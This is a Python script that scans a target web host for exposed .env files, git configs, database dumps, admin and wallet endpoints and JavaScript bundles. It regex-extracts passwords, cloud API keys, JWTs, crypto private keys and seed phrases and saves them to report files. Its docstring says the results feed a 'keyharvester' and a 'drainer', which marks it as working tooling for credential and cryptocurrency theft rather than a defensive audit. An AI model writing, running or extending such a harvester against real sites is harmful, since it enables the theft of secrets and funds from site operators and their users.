import http.client
import ssl
import re
import sys
import json
import os
import asyncio
from urllib.parse import urljoin

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

# Paths that commonly leak secrets on pre-prod / misconfigured apps
LEAK_PATHS = [
    "/",
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.development",
    "/env",
    "/config.js",
    "/config.json",
    "/app.config.js",
    "/static/js/main.js",
    "/assets/index.js",
    "/_next/static/chunks/main.js",
    "/api",
    "/api/",
    "/api/config",
    "/api/health",
    "/api/status",
    "/api/v1/config",
    "/api/wallet",
    "/api/wallets",
    "/api/keys",
    "/api/admin",
    "/admin",
    "/admin/config",
    "/debug",
    "/debug/vars",
    "/actuator",
    "/actuator/env",
    "/server-status",
    "/phpinfo.php",
    "/.git/config",
    "/.git/HEAD",
    "/backup.zip",
    "/backup.sql",
    "/dump.sql",
    "/wp-config.php.bak",
    "/robots.txt",
    "/sitemap.xml",
    "/swagger.json",
    "/openapi.json",
    "/graphql",
]

REGEX = {
    "Password / Secret assignment": re.compile(
        r"(?i)(?:pass(?:word)?|pwd|secret|auth[_-]?token|api[_-]?key|private[_-]?key|jwt[_-]?secret|db[_-]?pass(?:word)?)\s*[:=]\s*['\"]?([^'\"\s]{4,200})"
    ),
    "AWS Key": re.compile(r"AKIA[0-9A-Z]{16}"),
    "Google API Key": re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
    "JWT": re.compile(r"eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+"),
    "EVM Private Key": re.compile(r"\b(?:0x)?[a-fA-F0-9]{64}\b"),
    "BTC WIF": re.compile(r"\b[5KL][1-9A-HJ-NP-Za-km-z]{50,52}\b"),
    "Hex seed-like": re.compile(r"(?i)(?:private[_-]?key|secret[_-]?key|wallet[_-]?key)\s*[:=]\s*['\"]?(0x)?[a-fA-F0-9]{64}"),
    "Mnemonic hint": re.compile(r"(?i)(?:mnemonic|seed[_-]?phrase|recovery[_-]?phrase)\s*[:=]\s*['\"]([^'\"]{20,300})"),
    "Email": re.compile(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+")
,
}


def _fetch(host, path, port=443, use_ssl=True, timeout=6.0):
    try:
        if use_ssl:
            conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=timeout)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        headers = {
            "Host": host,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        conn.request("GET", path, headers=headers)
        resp = conn.getresponse()
        body = resp.read(2_000_000).decode("utf-8", errors="ignore")
        hdrs = {k: v for k, v in resp.getheaders()}
        status = resp.status
        conn.close()
        return status, hdrs, body
    except Exception as e:
        return 0, {}, ""


def _extract_js_urls(html, host):
    urls = []
    for m in re.findall(r"(?:src|href)=['\"]([^'\"]+\.js(?:\?[^'\"]*)?)['\"]", html, re.I):
        if m.startswith("http"):
            urls.append(m)
        elif m.startswith("//"):
            urls.append("https:" + m)
        elif m.startswith("/"):
            urls.append(f"https://{host}{m}")
        else:
            urls.append(f"https://{host}/{m}")
    # de-dupe preserve order
    seen = set()
    out = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out[:25]


def scan_text_for_secrets(text, source):
    findings = []
    if not text:
        return findings
    for label, cre in REGEX.items():
        for match in cre.findall(text):
            val = match if isinstance(match, str) else (match[0] if match else "")
            if not val or len(str(val)) < 4:
                continue
            # reduce noise on generic hex from hashes
            if label == "EVM Private Key":
                clean = str(val)[2:] if str(val).startswith("0x") else str(val)
                if clean.lower() == "0" * 64 or not re.fullmatch(r"[a-fA-F0-9]{64}", clean):
                    continue
            item = {"type": label, "value": str(val)[:500], "source": source}
            if item not in findings:
                findings.append(item)
                sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE INTEL [{label}] [***]\033[0m\n")
                sys.stdout.write(f"  ├── Source : {source}\n")
                sys.stdout.write(f"  └── Value  : \033[92m{str(val)[:120]}\033[0m\n")
                sys.stdout.flush()
    return findings


async def parse_target_source(host):
    """
    Aggressive remote DOM + leak-path + JS-bundle intelligence pull.
    Returns aggregated text for downstream keyharvester (drainer untouched).
    """
    sys.stdout.write(f"\n\033[95m[***] LIVE DOM + LEAK-PATH + JS SECRET EXTRACTOR [***]\033[0m\n")
    sys.stdout.write(f"\033[90m[TARGET] https://{host}\033[0m\n\n")
    sys.stdout.flush()

    aggregated = []
    all_findings = []
    js_to_fetch = []

    def work(path):
        return path, _fetch(host, path)

    # Parallel-ish via thread pool through asyncio
    loop = asyncio.get_event_loop()
    tasks = [loop.run_in_executor(None, work, p) for p in LEAK_PATHS]
    results = await asyncio.gather(*tasks)

    for path, (status, headers, body) in results:
        if status == 0 or not body:
            continue
        if status in (404, 403, 401) and path not in ("/",):
            # still scan tiny bodies for error leaks
            if len(body) < 80:
                continue
        sys.stdout.write(f" \033[92m[{status}] {path} ({len(body)} bytes)\033[0m\n")
        sys.stdout.flush()
        aggregated.append(f"\n/* PATH {path} STATUS {status} */\n{body}")
        all_findings.extend(scan_text_for_secrets(body, f"https://{host}{path}"))

        # headers
        hdr_blob = "\n".join(f"{k}: {v}" for k, v in headers.items())
        all_findings.extend(scan_text_for_secrets(hdr_blob, f"https://{host}{path}#headers"))

        if path == "/" or path.endswith(".html") or "text/html" in headers.get("Content-Type", ""):
            js_to_fetch.extend(_extract_js_urls(body, host))

    # Fetch discovered JS bundles (limit)
    seen_js = set()
    for js_url in js_to_fetch:
        if js_url in seen_js:
            continue
        seen_js.add(js_url)
        if len(seen_js) > 15:
            break
        try:
            # only same-host JS for scope safety on self-test
            if host not in js_url:
                continue
            path = js_url.split(host, 1)[-1] or "/"
            if not path.startswith("/"):
                path = "/" + path
            status, headers, body = await loop.run_in_executor(None, lambda p=path: _fetch(host, p))
            if status == 200 and body:
                sys.stdout.write(f" \033[92m[JS] {path} ({len(body)} bytes)\033[0m\n")
                sys.stdout.flush()
                aggregated.append(f"\n/* JS {path} */\n{body}")
                all_findings.extend(scan_text_for_secrets(body, js_url))
        except Exception:
            pass

    combined = "\n".join(aggregated)
    sys.stdout.write(f"\n\033[92m[+] Remote intelligence complete. Bytes={len(combined)} findings={len(all_findings)}\033[0m\n")
    sys.stdout.flush()

    os.makedirs("reports/intelligence", exist_ok=True)
    with open("reports/intelligence/remote_source_dump.txt", "w", encoding="utf-8", errors="ignore") as f:
        f.write(combined[:5_000_000])
    with open("reports/intelligence/secret_findings.json", "w", encoding="utf-8") as f:
        json.dump(all_findings, f, indent=2)

    return {"status": "success", "findings": all_findings, "aggregated_text": combined, "count": len(all_findings)}
